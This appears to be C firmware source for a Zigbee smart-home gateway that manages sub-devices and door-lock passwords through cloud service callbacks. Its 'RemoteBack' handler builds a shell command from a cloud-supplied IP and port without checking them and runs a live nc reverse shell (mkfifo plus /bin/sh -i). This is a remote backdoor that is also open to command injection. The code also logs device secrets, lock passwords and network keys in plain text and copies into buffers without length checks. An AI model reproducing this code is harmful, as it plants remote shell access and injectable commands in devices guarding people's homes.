#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <pthread.h>

#include "common.h"
#include "timer.h"
#include "log.h"
#include "hex.h"

#include "afly.h"

#include "product.h"
#include "product_sub.h"
#include "zigbee.h"

#include "jansson.h"
#include "json_parser.h"

#include "nxpx.h"
#include "schedule.h"




void _afly_init(int loglvl);
void _afly_end();

static stAFlyEnv_t env = {0};


static int post_all_properties(stGateway_t *gw);

int gateway_add_subdev(void *arg, char *in, char *out, int out_len, void *ctx);
int gateway_del_subdev(void *arg, char *in, char *out, int out_len, void *ctx);
int gateway_clr_subdev(void *arg, char *in, char *out, int out_len, void *ctx);
int gateway_remote_back(void *arg, char *in, char *out, int out_len, void *ctx);

static int subdev_add_key(void *arg, char *in, char *out, int out_len, void *ctx);
static int subdev_del_key(void *arg, char *in, char *out, int out_len, void *ctx);
static int subdev_clr_key(void *arg, char *in, char *out, int out_len, void *ctx);
static int subdev_get_key_list(void *arg, char *in, char *out, int out_len, void *ctx);
static int subdev_get_dynamic(void *arg, char *in, char *out, int out_len, void *ctx);
static stAflyService_t svrs[] = {
	{ "GW",		"1000", "AddSubDev",	gateway_add_subdev  },
	{ "GW",		"1000", "DelSubDev",	gateway_del_subdev  },
	{ "GW",		"1000", "ClrSubDev",	gateway_clr_subdev  },
	{	"Gw",		"1000",	"RemoteBack", gateway_remote_back },

	{ "NXP",	"1203", "AddKey",			subdev_add_key },
	{ "NXP",	"1203", "DeleteKey",	subdev_del_key },
	{ "NXP",	"1203",	"clearKey",		subdev_clr_key },
	{	"NXP",	"1203",	"GetDynamic", subdev_get_dynamic},
	{ "NXP",	"1203", "GetKeyList",	subdev_get_key_list },
};

static stSchduleTask_t gw_info_task;
static void gw_info_func(void *arg) {
	int ret = product_init();

	stGateway_t *gw = product_get_gw();
	if (ret > 0) {
		post_all_properties(gw);
	}

	if (ret < 0) {
		schedue_add(&gw_info_task, 1000, gw_info_func, NULL);
		int delt = schedue_first_task_delay();
		timer_set(env.th, &env.task_timer, delt);
	} else {
		schedue_add(&gw_info_task, 20 * 60* 1000, gw_info_func, NULL);
		int delt = schedue_first_task_delay();
		timer_set(env.th, &env.task_timer, delt);
	}

}

//////////////////////////////////////////////////////////////////////////
int		afly_init(void *_th, void *_fet, int loglvl, char *dbfile) {
	env.th = _th;
	env.fet = _fet;


	timer_init(&env.step_timer, afly_handler_run);
	timer_init(&env.sync_list_timer, afly_handler_sync_list_run);
	timer_init(&env.task_timer, afly_handler_task_run);

	lockqueue_init(&env.msgq);
	
	product_init();
	schedue_add(&gw_info_task, 1000, gw_info_func, NULL);
	int delt = schedue_first_task_delay();
	timer_set(env.th, &env.task_timer, delt);

	product_sub_load_all(dbfile, _fet);
	product_sub_view();


	_afly_init(loglvl);


	timer_set(env.th, &env.sync_list_timer, 2000);
	return 0;
}
int		afly_push_msg(int eid, void *param, int len) {
	if (eid == eid) {
		stEvent_t *e = MALLOC(sizeof(stEvent_t));
		if (e == NULL) {
			return -1;
		}
		e->eid = eid;
		e->param = param;
		lockqueue_push(&env.msgq, e);
		afly_step();
	}
	return 0;
}

int		afly_step() {
	timer_cancel(env.th, &env.step_timer);
	timer_set(env.th, &env.step_timer, 10);
	return 0;
}
void	afly_handler_run(struct timer *timer) {
	stEvent_t *e = NULL;
	if (lockqueue_pop(&env.msgq, (void **)&e) && e != NULL) {
		afly_handler_event(e);
		FREE(e);
		afly_step();
	}
}

static int afly_connect_change_on = 0;
void	afly_handler_sync_list_run(struct timer *timer) {
	timer_cancel(env.th, &env.sync_list_timer);
	static int last = 0;

	if (afly_connect_change_on == 1 || time(NULL) - last > 60 * 15) {
		log_info("Sync Npx & xxxx List ...\r\n");
		stGateway_t *gw = product_get_gw();
		if (gw->connected) {
			nxp_get_list();
		}
		afly_connect_change_on = 0;

		last = time(NULL);
	}
}

void	afly_handler_task_run(struct timer *timer) {
		int delt = schedue_first_task_delay();
		if (delt < 0) {	
			return;
		}

		if (delt == 0) {
			stSchduleTask_t *task = schedue_first_task_to_exec();
			schedue_del(task);

			((int (*)(void *))task->func)(task->arg);
		}

		delt = schedue_first_task_delay();
		if (delt < 0) {
			return;
		}

		timer_set(env.th, &env.task_timer, delt);
}

int		afly_handler_event(stEvent_t *event) {
	log_info("[%d] afly module now not support event handler, only free the event!!!", __LINE__);
	return 0;
}
///////////////////////////////////////////////////////////////////////////////////////////////
static stAflyService_t *afly_search_service(char *app, char *model, char *identifier) {
	int i = 0;
	int cnt = sizeof(svrs)/sizeof(svrs[0]);	
	for (i = 0; i < cnt; i++) {
		stAflyService_t *svr = &svrs[i];
		if (strcmp(app, svr->app) != 0) {
			continue;
		}
		if (strcmp(model, svr->model) != 0) {
			continue;
		}
		if (strcmp(identifier, svr->name) != 0) {
			continue;
		}
		return svr;
	}

	return NULL;
}


///////////////////////////// AFly Lock Callback //////////////////////////////////////////////
static int subdev_add_key(void *arg, char *in, char *out, int out_len, void *ctx) {
	log_info("in : %s", in);

	stSubDev_t *sd = (stSubDev_t *)ctx;


	json_error_t error;
	json_t *jin = json_loads(in, 0, &error);
	if (jin == NULL) {
		log_warn("error json format!!!");
		return -1;
	}


	int LockType = -1;	json_get_int(jin, "LockType", &LockType);
	int UserLimit = -1;	json_get_int(jin, "UserLimit", &UserLimit);
	const char *KeyStr = json_get_string(jin, "KeyStr");
	int Start = -1;			json_get_int(jin, "Start", &Start);
	int End = -1;				json_get_int(jin, "End", &End);

	if (LockType != 2) {
		log_warn("now only support pass type!");
		json_decref(jin);
		return -2;
	}
	if (UserLimit != 1) {
		log_warn("now only support normal user!");
		json_decref(jin);
		return -3;
	}

	if (!product_valid_password_string(KeyStr)) {
		log_warn("not valid key String");
		json_decref(jin);
		return -4;
	}

	if (Start == -1) {
		Start = time(NULL);
	}
	if (End == -1) {
		End = time(NULL) + 3600 * 24 * 365;
	}

	
	int len = strlen(KeyStr);
	stLockKey_t *key = product_sub_lock_add_key_wait_ack(sd, LockType, UserLimit, (char *)KeyStr, len);
	if (key == NULL) {
		log_warn("full password!!!");
		json_decref(jin);
		return -5;
	}

	//schedule_a();

	if (LockType == 2) {
		int passId = atoi(KeyStr);
		nxp_lock_add_pass(sd->deviceName, key->id, 0, 0, Start, End, (char *)&passId, 4);
	} 


	json_decref(jin);
	
	return 0;
}
static int subdev_del_key(void *arg, char *in, char *out, int out_len, void *ctx) {
	log_info("in : %s", in);

	stSubDev_t *sd = (stSubDev_t *)ctx;


	json_error_t error;
	json_t *jin = json_loads(in, 0, &error);
	if (jin == NULL) {
		log_warn("error json format!!!");
		return -1;
	}

	int LockType = -1;	json_get_int(jin, "LockType", &LockType);
	const char *KeyID = json_get_string(jin, "KeyID");

	if (LockType != 2) {
		json_decref(jin);
		log_warn("now only support pass type!");
		return -2;
	}

	if (strcmp(KeyID, "******") == 0) {
		nxp_lock_clr_pass(sd->deviceName, 0);
		return 0;
	}

	int id = atoi(KeyID);
	if (id < 1000000) {
		json_decref(jin);
		log_warn("invalid Key ID");
		return -3;
	}

	
	stLockKey_t *key = product_sub_lock_get_key_by_id(sd, LockType, id);
	if (key == NULL) {
		json_decref(jin);
		log_warn("no such key:%d", id);
		return -4;
	}

	
	if (LockType == 2) {
		nxp_lock_del_pass(sd->deviceName, key->id, 0);
	}
	
	json_decref(jin);
	return 0;
}


static int subdev_clr_key(void *arg, char *in, char *out, int out_len, void *ctx) {
	log_info("in : %s", in);

	stSubDev_t *sd = (stSubDev_t *)ctx;


	json_error_t error;
	json_t *jin = json_loads(in, 0, &error);
	if (jin == NULL) {
		log_warn("error json format!!!");
		return -1;
	}

	int LockType = -1;	json_get_int(jin, "LockType", &LockType);

	if (LockType != 2) {
		json_decref(jin);
		log_warn("now only support pass type!");
		return -2;
	}

	if (LockType == 2) {
		nxp_lock_clr_pass(sd->deviceName, 0);
	}

	json_decref(jin);
	return 0;
}


static int subdev_get_dynamic(void *arg, char *in, char *out, int out_len, void *ctx) {
	log_info("in : %s", in);

	//stSubDev_t *sd = (stSubDev_t *)ctx;

	/** TODO */
	

	return 0;

}

static int subdev_get_key_list(void *arg, char *in, char *out, int out_len, void *ctx) {
	log_info("in : %s", in);

	stSubDev_t *sd = (stSubDev_t *)ctx;


	json_error_t error;
	json_t *jin = json_loads(in, 0, &error);
	if (jin == NULL) {
		log_warn("error json format!!!");
		return -1;
	}

	int LockType = -1;	json_get_int(jin, "LockType", &LockType);
	if (LockType != 2) {
		json_decref(jin);
		log_warn("now only support pass type!");
		return -2;
	}
	json_decref(jin);

	json_t *jout = json_array();
	
	int num = product_sub_lock_get_key_num(sd, LockType);
	int i = 0; 
	for (i = 0; i < num; i++) {
		json_t *ji = json_object();
		stLockKey_t *key = product_sub_lock_get_key_i(sd, i, LockType);
		
		if (key != NULL) {
			json_object_set_new(ji, "LockType", json_integer(key->type));	
			json_object_set_new(ji, "UserLimit", json_integer(key->limit));

			char KeyStr[64]; snprintf(KeyStr, key->len+1, "%s", key->buf);
			json_object_set_new(ji, "KeyStr", json_string(KeyStr));

			char KeyID[32]; sprintf(KeyID, "%d", key->id);
			json_object_set_new(ji, "KeyID", json_string(KeyID));

			json_array_append_new(jout, ji);
		}
	}

	const char *sout = json_dumps(jout, 0);
	if (sout == NULL) {
		json_decref(jout);
		log_warn("no enough memory");
		return -3;
	}
	
	int len = strlen(sout);
	if (len >= out_len) {
		log_warn("message to long : %d/%d", len, out_len);
		json_decref(jout);
		return -4;
	}
	strcpy(out, sout);

	log_info("DevKeyList: %s", sout);

	json_decref(jout);

	return 0;
}


static int subdev_get_property(char *in, char *out, int out_len, void *ctx) {
	log_info("in : %s", in);

	log_warn("now not support !");

	//stSubDev_t *sdc = (stSubDev_t*)sdc;

	return -1;
}

static int subdev_set_property(char *in, void *ctx) {

	log_info("in : %s", in);

	log_warn("now not support !");

	//stSubDev_t *sdc = (stSubDev_t*)sdc;

	return -1;
}

static int subdev_call_service(char *identifier, char *in, char *out, int out_len, void *ctx) {
	log_info("in : %s", in);

#if 0
	stSubDevCfg_t *sdc = (stSubDevCfg_t*)ctx;

	log_info("productKey:%s, deviceName:%s, deviceSecret:%s", sdc->productKey, sdc->deviceName, sdc->deviceSecret);

	if (strcmp(identifier, "set") == 0 || strcmp(identifier, "get") == 0) {
		log_warn("get/set will through get/set interface.");
		return -1;
	}

	if (! (  strcmp(identifier, "AddKey") == 0 ||
				strcmp(identifier, "DeleteKey") == 0 || 
				strcmp(identifier, "GetKeyList") == 0
				) ) {
		log_warn("not support service : %s", identifier);
		return -1;
	}

	json_error_t error;
	json_t *jin = json_loads(in, 0, &error);
	if (jin == NULL) {
		log_warn("error json format!!!");
		return -1;
	}

	if (strcmp(identifier, "AddKey") == 0) {
		int LockType = -1; json_get_int(jin, "LockType", &LockType);
		int UserLimit = -1; json_get_int(jin, "UserLimit", &UserLimit);
		const char *KeyId = json_get_string(jin, "KeyId");
		if (LockType == -1 || UserLimit == -1) {
			log_warn("Error Arg: LockType(%d), UserLimit(%d)", LockType, UserLimit);
			return -1;
		}
		if (LockType != 2) { // 1-> finger, 2->pass, 3->card, 4->yaoshi
			log_warn("Error LockType %d", LockType);
			return -1;
		}
		if (UserLimit != 1) { // 1-> normal, 2->admin, 3->jiechi user
			log_warn("Error UserLimit %d", UserLimit);
			return -1;
		}
		if (KeyId == NULL) {
			log_warn("Error, No KeyId");
			return -1;
		}


		log_info("add key LockType:%d, UserLimit:%d, KeyId:%s ...", LockType, UserLimit, KeyId);
		/**> add key */
		return 0;
	} else if (strcmp(identifier, "DeleteKey") == 0) {
		const char *KeyId = json_get_string(jin, "KeyId");
		if (KeyId == NULL) {
			log_warn("Error, No Key Id");
			return -1;
		}
		log_info("del key , KeyId:%s ...",  KeyId);
		/**> Del Key */
	} else if (strcmp(identifier, "GetKeyList") == 0) {
		int LockType = -1; json_get_int(jin, "LockType", &LockType);
		if (LockType != 2) {
			log_warn("Error LockType %d", LockType);
			return -1;
		}
		log_info("Get Key List, LockType : %d ...", LockType);	
		/**> Get Key List */
	}
#endif

#if 0
	lock_t *lock = ctx;
	linkkit_gateway_post_property_json_sync(lock->devid, "{\"SetTimer\": \"hello, world!\"}", 5000);
#endif

	stSubDev_t *sd = (stSubDev_t*)ctx;

	stAflyService_t *svr = afly_search_service(sd->app, sd->type, identifier);
	if (svr == NULL) {
		log_warn("not support service : %s", identifier);
		return -1;
	}

	return svr->func(svr, in, out, out_len, ctx);
}
ssize_t subdev_down_rawdata(const void *in, int in_len, void *out, int out_len, void *ctx) {
	log_debug_hex("in : ", in, in_len);
	log_warn("not support down rawdata!");
	return -1;
}

int subdev_post_rawdata_reply(const void *data, int len, void *ctx) {
	log_debug_hex("data: ", data, len);
	log_warn("not support rawdata relay!");
	return -1;
}
static linkkit_cbs_t dev_cbs = {
	.get_property = subdev_get_property,
	.set_property = subdev_set_property,
	.call_service = subdev_call_service,
	.down_rawdata = subdev_down_rawdata,
	.post_rawdata_reply = subdev_post_rawdata_reply,

};

///////////////////////////// AFly Ota Callback ///////////////////////////////////////////////////////
static void ota_callback(int event, const char *version, void *ctx) {
	log_info("event: %d, version: %s\n", event, version);

	log_warn("now not support ota function !!!");
#if 0
	linkkit_gateway_ota_update(512);
#endif
}

///////////////////////////// AFly Callback //////////////////////////////////////////////////////////
static int gateway_post_subdev_list() {
	int num = product_sub_get_num();
	int i = 0;
	

	log_info("subdev list num: %d", num);
	json_t *jarg = json_object();
	json_t *ja = json_array();
	for (i = 0; i < num; i++) {
		stSubDev_t *sd = product_sub_get_i(i);
		if (sd == NULL) {
			continue;
		}
		json_t *ji = json_object();
		json_object_set_new(ji, "deviceName", json_string(sd->deviceName));
		json_object_set_new(ji, "deviceSecret", json_string(sd->deviceSecret));
		json_object_set_new(ji, "productKey", json_string(sd->productKey));
		json_array_append_new(ja, ji);
	}
	json_object_set_new(jarg, "SubDevList", ja);

	char *sarg = json_dumps(jarg, 0);
	if (sarg == NULL) {
		log_warn("no memory!");
		json_decref(jarg);
		return -1;
	}

	stGateway_t *gw = product_get_gw();
	
	log_info("post subdev: %s", sarg);
	int ret = linkkit_gateway_post_property_json_sync(gw->lk_dev, sarg, 5000);
	log_info("post subdev list ret: %d", ret);
	
	free(sarg);
	json_decref(jarg);

	return 0;
}

int gateway_add_subdev(void *arg, char *in, char *out, int out_len, void *ctx) {
	log_info("in: %s", in);

	//stGateway_t *gw = (stGateway_t*)ctx;

	json_error_t error;
	json_t *jin = json_loads(in, 0, &error);
	if (jin == NULL) {
		log_warn("error json format!!!");
		return -1;
	}

	const char *slist = json_get_string(jin, "SubDevList");
	if (slist == NULL) {
		log_warn("Can't find SubDevList Item");
		json_decref(jin);
		return -2;
	}

	json_t *jlist = json_loads(slist, 0, &error);
	if (jlist == NULL) {
		log_warn("SubDevList format error");
		json_decref(jin);
		return -3;
	}


	if (!json_is_array(jlist)) {
		log_warn("SubDevList is not jarray");
		json_decref(jin);
		return -4;
	}



	size_t  i		= 0;
	json_t *jv	= NULL;
	int flag = 0;
	json_array_foreach(jlist, i, jv) {
		const char *name = json_get_string(jv, "deviceName");
		const char *key  = json_get_string(jv, "deviceSecret");
		const char *sec  = json_get_string(jv, "productKey");
		if (name == NULL || key == NULL || sec == NULL) {
			continue;
		}

		stSubDev_t *sd = product_sub_search_by_name(name);
		if (sd != NULL) {
			log_warn("Exsit Dev : %s", name);
			continue;
		}

		int ret = product_sub_add(name, key, sec);
		if (ret != 0) {
			log_warn("Add Sub Dev name(%s), key(%s), sec(%s) failed, ret:%d", name, key, sec, ret);
			continue;
		} 

		log_warn("Add Sub Dev name(%s), key(%s), sec(%s) ok", name, key, sec);
		flag ++;
	}
	
	if (flag) {
		nxp_get_list();
		gateway_post_subdev_list();
	}

	json_decref(jin);


	return 0;
}
int gateway_del_subdev(void *arg, char *in, char *out, int out_len, void *ctx) {
	log_info("in: %s", in);

	//stGateway_t *gw = (stGateway_t*)ctx;

	json_error_t error;
	json_t *jin = json_loads(in, 0, &error);
	if (jin == NULL) {
		log_warn("error json format!!!");
		return -1;
	}

	const char *slist = json_get_string(jin, "SubDevList");
	if (slist == NULL) {
		log_warn("Can't find SubDevList Item");
		json_decref(jin);
		return -2;
	}

	json_t *jlist = json_loads(slist, 0, &error);
	if (jlist == NULL) {
		log_warn("SubDevList format error");
		json_decref(jin);
		return -3;
	}


	if (!json_is_array(jlist)) {
		log_warn("SubDevList is not jarray");
		json_decref(jin);
		return -4;
	}

	size_t  i		= 0;
	json_t *jv	= NULL;
	int flag = 0;
	json_array_foreach(jlist, i, jv) {
		const char *name = json_get_string(jv, "deviceName");
		const char *key  = json_get_string(jv, "deviceSecret");
		const char *sec  = json_get_string(jv, "productKey");
		if (name == NULL || key == NULL || sec == NULL) {
			continue;
		}

		stSubDev_t *sd = product_sub_search_by_name(name);
		if (sd == NULL) {
			log_warn("Not Exsit Dev : %s", name);
			continue;
		}

		int ret = product_sub_del(name);
		if (ret != 0) {
			log_warn("Del Sub Dev name(%s) failed, ret:%d", name, ret);
			continue;
		} 

		log_info("Del Sub Dev name(%s) ok", name);
		
		flag++;
	}

	if (flag) {
		//nxp_get_list();
		gateway_post_subdev_list();
	}



	json_decref(jin);


	return -1;
}

int gateway_clr_subdev(void *arg, char *in, char *out, int out_len, void *ctx) {
	log_info("in: %s", in);


	//stGateway_t *gw = (stGateway_t*)ctx;


	int ret = product_sub_clr();
	log_info("Clear SubDev %d", ret);
	
	if (ret != 0) {
		return -1;
	}

	gateway_post_subdev_list();

	return 0;
}


int gateway_remote_back(void *arg, char *in, char *out, int out_len, void *ctx) {
	log_info("in: %s", in);

	//stGateway_t *gw = (stGateway_t*)ctx;

	json_error_t error;
	json_t *jin = json_loads(in, 0, &error);
	if (jin == NULL) {
		log_warn("error json format!!!");
		return -1;
	}

	const char *BackSvrIp = json_get_string(jin, "BackSvrIp");
	int BackSvrPort = -1;		json_get_int(jin, "BackSvrPort", &BackSvrPort);
	if (BackSvrIp == NULL || BackSvrPort == -1) {
		log_warn("Remote Back Arg Error : BackSvIp:%s, BackSvrPort:%d", BackSvrIp == NULL ? "NULL" : BackSvrIp, BackSvrPort);
		json_decref(jin);
		return -2;
	}


	if (1) {
		char cmd[1024];
		system("killall nc");
		sprintf(cmd, "(rm -rf /tmp/rmt_pipe &&  mkfifo /tmp/rmt_pipe && /bin/sh -i 2>&1  </tmp/rmt_pipe | nc %s %d > /tmp/rmt_pipe) & ",
				BackSvrIp, BackSvrPort);
		system(cmd);
		//system("/usr/bin/remote_shell.sh > /dev/null &");
	}

	json_decref(jin);

	return 0;
}

static int gateway_get_property(char *in, char *out, int out_len, void *ctx) {
	log_info("in: %s", in);

	stGateway_t *gw = (stGateway_t*)ctx;
	if (!gw) {
		log_info("gateway not found\n");
		return -1;
	}

	json_error_t error;
	json_t *jin = json_loads(in, 0, &error);
	if (jin == NULL) {
		log_warn("error json format!!!");
		return -1;
	}

	if (!json_is_array(jin)) {
		log_warn("error json type, not array!!!");
		json_decref(jin);
		return -1;
	}

	int iSize =	json_array_size(jin);
	if (iSize <= 0) {
		log_warn("error json array size!!!");
		json_decref(jin);
		return -1;
	}

	json_t *jret = json_object();
	if (jret == NULL) {
		log_warn("error new json object ret failed");
		json_decref(jin);
		return -1;
	}

	size_t  i		= 0;
	json_t *jv	= NULL;
	json_array_foreach(jin, i, jv) {
		const char *sv = json_string_value(jv);
		if (strcmp(sv, "ZB_Band") == 0) {
			json_object_set_new(jret, "ZB_Band", json_integer(gw->ZB_Band));
		} else if (strcmp(sv, "ZB_Channel") == 0) {
			json_object_set_new(jret, "ZB_Channel", json_integer(gw->ZB_Channel));
		} else if (strcmp(sv, "ZB_CO_MAC") == 0) {	
			json_object_set_new(jret, "ZB_CO_MAC", json_string(gw->ZB_CO_MAC));
		} else if (strcmp(sv, "ZB_PAN_ID") == 0) {
			json_object_set_new(jret, "ZB_PAN_ID", json_string(gw->ZB_PAN_ID));
		} else if (strcmp(sv, "EXT_PAN_ID") == 0) {
			json_object_set_new(jret, "EXT_PAN_ID", json_string(gw->EXT_PAN_ID));
		} else if (strcmp(sv, "NETWORK_KEY") == 0) {
			json_object_set_new(jret, "NETWORK_KEY", json_string(gw->NETWORK_KEY));
		} else if (strcmp(sv, "SubDevList") == 0) {
			int num = product_sub_get_num();
			int i = 0;
			json_t *ja = json_array();
			for (i = 0; i < num; i++) {
				stSubDev_t *sd = product_sub_get_i(i);
				if (sd == NULL) {
					continue;
				}
				json_t *ji = json_object();
				json_object_set_new(ji, "deviceName", json_string(sd->deviceName));
				json_object_set_new(ji, "deviceSecret", json_string(sd->deviceSecret));
				json_object_set_new(ji, "productKey", json_string(sd->productKey));
				json_array_append_new(ja, ji);
			}
			json_object_set_new(jret, "SubDevList", ja);
		}
	}

	json_decref(jin);

	char *sret = json_dumps(jret, 0);
	if (sret == NULL) {
		log_warn("error no memnory : json_dumps");
		json_decref(jret);
		return -1;
	}

	strcpy(out, sret);
	log_info("out : %s", out);

	free(sret);
	json_decref(jret);

	return 0;
}

static int gateway_set_property(char *in, void *ctx) {
	log_info("in: %s\n", in);

	stGateway_t *gw = (stGateway_t*)ctx;
	if (!gw) {
		log_info("gateway not found\n");
		return -1;
	}

	json_error_t error;
	json_t *jin = json_loads(in, 0, &error);
	if (jin == NULL) {
		log_warn("error json format!!!");
		return -1;
	}

	int ZB_Channel = -1;
	int ZB_Band = -1;
	const char *ZB_PAN_ID = NULL;
	const char *EXT_PAN_ID =  NULL;
	const char *ZB_CO_MAC =  NULL;
	const char *NETWORK_KEY =  NULL;


	json_t *jBand = json_object_get(jin, "ZB_Band");
	if (jBand != NULL) {
		json_get_int(jin, "ZB_Band", &ZB_Band);
	}

	json_t *jChannel = json_object_get(jin, "ZB_Channel");
	if (jChannel != NULL) {
		json_get_int(jin, "ZB_Channel", &ZB_Channel);
	}

	json_t *jPanid = json_object_get(jin, "ZB_PAN_ID");
	if (jPanid != NULL) {
		ZB_PAN_ID =  json_get_string(jin, "ZB_PAN_ID");
	}

	json_t *jExtId = json_object_get(jin, "EXT_PAN_ID");
	if (jExtId != NULL) {
		EXT_PAN_ID =  json_get_string(jin, "EXT_PAN_ID");
	}

	json_t *jZbMac = json_object_get(jin, "ZB_CO_MAC");
	if (jZbMac != NULL) {
		ZB_CO_MAC =  json_get_string(jin, "ZB_CO_MAC");
	}

	json_t *jNetKey = json_object_get(jin, "NETWORK_KEY");
	if (jNetKey != NULL) {
		NETWORK_KEY =  json_get_string(jin, "NETWORK_KEY");
	}


	if (ZB_Band != -1) {
		log_warn("Error ZB_Band: %d, readonly!", ZB_Band);
		json_decref(jin);
		return -1;
	}

	if (ZB_CO_MAC != NULL) {
		log_warn("Error ZB_CO_MAC: %s, readonly!", ZB_CO_MAC);
		json_decref(jin);
		return -1;
	}

	if (!(ZB_Channel >= 11 && ZB_Channel <= 26)) {
		log_warn("Error ZB_Channel: %d", ZB_Channel);
		json_decref(jin);
		return -1;
	} 
	if (strlen(ZB_PAN_ID) != 4) {
		log_warn("Error ZB_PAN_ID: %s", ZB_PAN_ID);
		json_decref(jin);
		return -1;
	} 
	if (strlen(EXT_PAN_ID) != 16) {
		log_warn("Error EXT_PAN_ID: %s", EXT_PAN_ID);
		json_decref(jin);
		return -1;
	}
	if (strlen(NETWORK_KEY) != 32) {
		log_warn("Error NETWORK_KEY: %s", NETWORK_KEY);
		json_decref(jin);
		return -1;
	}

	gw->ZB_Band = ZB_Band;
	gw->ZB_Channel = ZB_Channel;
	strcpy(gw->ZB_PAN_ID, ZB_PAN_ID);
	strcpy(gw->EXT_PAN_ID, EXT_PAN_ID);
	strcpy(gw->ZB_CO_MAC, ZB_CO_MAC);
	strcpy(gw->NETWORK_KEY, NETWORK_KEY);

	json_decref(jin);

	return 0;
}

static int gateway_call_service(char *identifier, char *in, char *out, int out_len, void *ctx) {
	log_info("in : %s", in);

	stAflyService_t *svr = afly_search_service("GW", "1000", identifier);
	if (svr == NULL) {
		log_warn("not support service : %s", identifier);
		return -1;
	}

	return svr->func(svr, in, out, out_len, ctx);
}


ssize_t gateway_down_rawdata(const void *in, int in_len, void *out, int out_len, void *ctx) {
	log_debug_hex("in : ", in, in_len);
	log_warn("not support down rawdata!");
	return -1;
}

int gateway_post_rawdata_reply(const void *data, int len, void *ctx) {
	log_debug_hex("data: ", data, len);
	log_warn("not support rawdata relay!");
	return -1;
}

static linkkit_cbs_t alink_cbs = {
	.get_property = gateway_get_property,
	.set_property = gateway_set_property,
	.call_service = gateway_call_service,
	.down_rawdata = gateway_down_rawdata,
	.post_rawdata_reply = gateway_post_rawdata_reply,
};


///////////////////////////// AFly Event //////////////////////////////////////////////////////////
static int post_all_properties(stGateway_t *gw) {
	json_t *jmsg = json_object();

	if (!jmsg) {
		return -1;
	}

	json_object_set_new(jmsg, "ZB_Band", json_integer(gw->ZB_Band));
	json_object_set_new(jmsg, "ZB_Channel", json_integer(gw->ZB_Channel));
	json_object_set_new(jmsg, "ZB_CO_MAC", json_string(gw->ZB_CO_MAC));
	json_object_set_new(jmsg, "ZB_PAN_ID", json_string(gw->ZB_PAN_ID));
	json_object_set_new(jmsg, "EXT_PAN_ID", json_string(gw->ZB_PAN_ID));
	json_object_set_new(jmsg, "NETWORK_KEY", json_string(gw->NETWORK_KEY));

	char buf[256];
	sprintf(buf, "V%d.%d.%d", MAJOR, MINOR, PATCH);
	json_object_set_new(jmsg, "Version", json_string(buf));

	char *smsg = json_dumps(jmsg, 0);
	if (smsg == NULL) {
		json_decref(jmsg);
		return -1;
	}

	log_info("property: %s", smsg);

	linkkit_gateway_post_property_json_sync(gw->lk_dev, smsg, 5000);

	free(smsg);
	json_decref(jmsg);

	return 0;
}

static int event_handler(linkkit_event_t *ev, void *ctx) {
	log_info("-");

	stGateway_t *gw = (stGateway_t*)ctx;

	switch (ev->event_type) {
		case LINKKIT_EVENT_CLOUD_CONNECTED:
			log_info("cloud connected");

			post_all_properties(gw);    /* sync to cloud */
			gw->connected = 1;

			afly_connect_change_on = 1;

			break;

		case LINKKIT_EVENT_CLOUD_DISCONNECTED:
			gw->connected = 0;
			log_info("cloud disconnected\n");
			break;

		case LINKKIT_EVENT_SUBDEV_DELETED:
			{
				char *productKey = ev->event_data.subdev_deleted.productKey;
				char *deviceName = ev->event_data.subdev_deleted.deviceName;
				log_info("delete subdev %s<%s>\n", productKey, deviceName);
			}
			break;

		case LINKKIT_EVENT_SUBDEV_PERMITED:
			{
				char *productKey = ev->event_data.subdev_permited.productKey;
				int timeoutSec = ev->event_data.subdev_permited.timeoutSec;
				log_info("permit subdev %s in %d seconds\n", productKey, timeoutSec);
			}
			break;
	}

	return 0;
}

///////////////////////////// AFly Init //////////////////////////////////////////////////////////
int linkkit_subdev_init() {
	return 0;
}

int linkkit_subdev_uninit() {
	return 0;
}



void _afly_init(int loglvl) {
	log_info("afly init ");

	linkkit_params_t *initParams = linkkit_gateway_get_default_params();
	if (!initParams) {
		log_warn("alfy get default params error");
		return;
	}

	int maxMsgSize = 20 * 1024;
	log_info("Set Param : LINKKIT_OPT_MAX_MSG_SIZE -> %d", maxMsgSize);
	linkkit_gateway_set_option(initParams, LINKKIT_OPT_MAX_MSG_SIZE, &maxMsgSize, sizeof(int));

	int maxMsgQueueSize = 8;
	log_info("Set Param : LINKKIT_OPT_MAX_MSG_QUEUE_SIZE -> %d", maxMsgQueueSize);
	linkkit_gateway_set_option(initParams, LINKKIT_OPT_MAX_MSG_QUEUE_SIZE, &maxMsgQueueSize, sizeof(int));

	//int loglevel = 5;
	int loglevel = loglvl;
	log_info("Set Param : LINKKIT_OPT_LOG_LEVEL -> %d", loglevel);
	linkkit_gateway_set_option(initParams, LINKKIT_OPT_LOG_LEVEL, &loglevel, sizeof(int));

	/**> event handler */
	log_info("linkkit_gateway_set_event_callback..");
	stGateway_t *gw = product_get_gw();
	linkkit_gateway_set_event_callback(initParams, event_handler, gw);

	log_info("linkkit_gateway_init...");
	if (linkkit_gateway_init(initParams) < 0) {
		log_warn("linkkit_gateway_init failed");
		return;
	}

	/**> alink cbs */
	log_info("linkkit_gateway_start...");
	gw->lk_dev = linkkit_gateway_start(&alink_cbs, gw);
	if (gw->lk_dev < 0) {
		log_warn("linkkit_gateway_start failed");
		return;
	}

	while (1 && gw->connected == 0) {
		sleep(1);
	}

	/**> ota callback */
	log_info("linkkit_gateway_ota_init...");
	linkkit_gateway_ota_init(ota_callback, NULL);


	/**> linkkit subdev */
	log_info("linkkit_subdev_init...");
	linkkit_subdev_init();

	while (0 && 1) {
		//linkkit_gateway_trigger_event_json_sync(gw->lk_dev, "Error", "{\"ErrorCode\": 0}", 10000);
		usleep(1000 * 1000);
	}

	log_info("afly init over!");
}

void _afly_end() {
	log_info ("alfy exit...");


	linkkit_subdev_uninit();

	stGateway_t *gw = product_get_gw();
	linkkit_gateway_stop(gw->lk_dev);

	linkkit_gateway_exit();
}

//////////////////////////// AFly Interface ////////////////////////////////////////////////////
// Z3
void  afly_z3_reg(unsigned char ieee_addr[IEEE_ADDR_BYTES],  unsigned int model_id, const char rand[SUBDEV_RAND_BYTES], const char *sign, int supe) {
	char ieee_addr_str[32];
	hex_string(ieee_addr_str, sizeof(ieee_addr_str), (u8*)ieee_addr, IEEE_ADDR_BYTES, 0, 0);

	char rand_str[64];
	hex_string(rand_str, sizeof(rand_str), (u8*)rand, SUBDEV_RAND_BYTES, 0, 0);

	char model_id_str[32];
	sprintf(model_id_str, "%d", model_id);

	log_info("registering [%s] with model_id:%08x, rand:%s, sign:%s", ieee_addr_str, model_id, rand_str, sign);

#if 0
	if (strncmp(model_id_str, "1102", 4) != 0) {
		log_warn("not support dev model: %s", model_id_str);
		return;
	}

